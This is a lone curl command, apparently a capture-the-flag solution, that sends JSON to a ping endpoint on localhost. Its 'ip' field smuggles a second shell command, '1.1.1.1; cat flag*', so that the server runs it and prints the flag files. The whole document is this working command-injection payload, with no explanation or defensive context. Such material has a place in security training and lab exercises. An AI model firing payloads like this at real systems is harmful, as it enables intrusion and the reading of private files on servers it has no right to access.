curl 'http://localhost:1337/ping' \
  -H 'Content-Type: application/json' \
  --data-raw '{"ip":"1.1.1.1; cat flag*"}'